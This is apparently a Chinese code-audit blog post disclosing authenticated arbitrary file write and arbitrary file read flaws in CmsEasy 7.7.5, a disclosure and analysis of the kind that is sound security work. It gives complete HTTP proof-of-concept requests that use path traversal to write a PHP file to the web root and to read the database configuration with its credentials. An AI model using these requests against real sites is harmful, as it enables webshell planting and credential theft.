=== Content from jdr2021.github.io_0f97fe55_20250114_225828.html ===
Toggle site

---

CatalogYou've read0%

1. [1. 厂商官网](#%E5%8E%82%E5%95%86%E5%AE%98%E7%BD%91)
2. [2. 安装包下载](#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD)
   1. [2.1. 任意文件写入漏洞getshell](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell)
      1. [2.1.1. 任意文件写入漏洞poc](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Epoc)
      2. [2.1.2. 任意文件写入漏洞代码分析](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
   2. [2.2. 任意文件读取漏洞](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E)
      1. [2.2.1. 任意文件读取漏洞poc](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9Epoc)
      2. [2.2.2. 任意文件读取漏洞代码分析](#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90)
![](/img/avatar.jpg)jdr天天混日子

---

[Articles35](/archives)[Tags28](/tags)[Categories10](/categories) [jdr](/) [Home](/)[Archives](/archives)[About](/about)CmsEasy\_7.7.5\_20211012存在任意文件写入和任意文件读取漏洞 2021-10-14|[php代码审计](/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)

---

CmsEasy\_7.7.5\_20211012存在任意文件写入漏洞和任意文件读取漏洞

# 厂商官网

[cmseasy](https://www.cmseasy.cn/)

# 安装包下载

<https://www.cmseasy.cn/download/>

![cmseasy](data:image/png;base64...)

<https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.5_UTF-8_20211012.zip>

## 任意文件写入漏洞getshell

后台漏洞，需登录。

### 任意文件写入漏洞poc

| ``` 12345678910 ``` | ``` POST /index.php?case=template&act=save&admin_dir=admin&site=default HTTP/1.1Host: 192.168.31.96Content-Length: 57X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4;Connection: closesid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?> ``` |
| --- | --- |

`.._d_`  代表  `../`，此处用来路径穿越

发送漏洞利用的poc数据包，响应内容是ok时，代表网站根目录下被写入了1.php文件。

![任意文件写入](data:image/png;base64...)

访问http://192.168.31.96/1.php (或者是http://localhost/1.php)，此时发现phpinfo被成功执行。

![任意文件写入](data:image/png;base64...)

### 任意文件写入漏洞代码分析

出现此漏洞的文件是`lib/admin/template_admin.php`

![任意文件写入](data:image/png;base64...)

`post`方法传入`sid=#data_d_.._d_.._d_.._d_1.php`，经过一轮的正则替换，最后`tpl=data/../../../1.php`

`post`方法传入`scontent=<?php phpinfo();?>`，先通过编码实例化，再通过正则替换将单引号转义，此时`content=<?php phpinfo();?>`，这里的正则处理是对XSS漏洞的处理，对写入的php代码不生效。

当`site=default`时，代码执行到最外层`else`处`（第2789行）`，此过程中，`content`值不变，通过`file_put_contents`造成了任意文件写入漏洞。

## 任意文件读取漏洞

后台漏洞，需登录。

### 任意文件读取漏洞poc

| ``` 12345678910 ``` | ``` POST /index.php?case=template&act=fetch&admin_dir=admin&site=default HTTP/1.1Host: 192.168.31.96X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0Content-Type: application/x-www-form-urlencoded;Cookie: login_username=admin; login_password=357fce333f91905f3e7342d10e5a5ce4; Connection: closeContent-Length: 32id=#data_d_.._d_.._d_.._d_config_d_config_database.php ``` |
| --- | --- |

`.._d_`  代表  `../`，此处用来路径穿越

发送漏洞利用的poc数据包

响应内容是`cmseasy`网站配置文件`config/config_database.php`的文件内容信息。

该响应信息中包含了数据库连接地址账号以及密码。

![任意文件写入](data:image/png;base64...)

### 任意文件读取漏洞代码分析

出现此漏洞的文件是`lib/admin/template_admin.php`

![任意文件写入](data:image/png;base64...)

`post`方法传入`id=#data_d_.._d_.._d_.._d_config_d_config_database.php`

通过一系列的正则替换`tpl=data/../../../config/config_database.php`

最后通过`第2757行`的`file_get_contents`函数读取到了配置文件信息。

Author: jdrLink: [https://jdr2021.github.io/2021/10/14/CmsEasy\_7.7.5\_20211012存在任意文件写入和任意文件读取漏洞/](https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/)Copyright Notice: All articles in this blog are licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) unless stating additionally.[代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)[实战webpack\_js算法逆向分析](/2021/10/15/%E5%AE%9E%E6%88%98webpack-js%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/)[记一次oracle数据库SQL注入bypass](/2021/09/29/%E8%AE%B0%E4%B8%80%E6%AC%A1oracle%E6%95%B0%E6%8D%AE%E5%BA%93SQL%E6%B3%A8%E5%85%A5bypass/)©2021 - 2024 By jdrDriven - [Hexo](http://hexo.io)|Theme - [Melody](https://github.com/Molunerfinn/hexo-theme-melody)
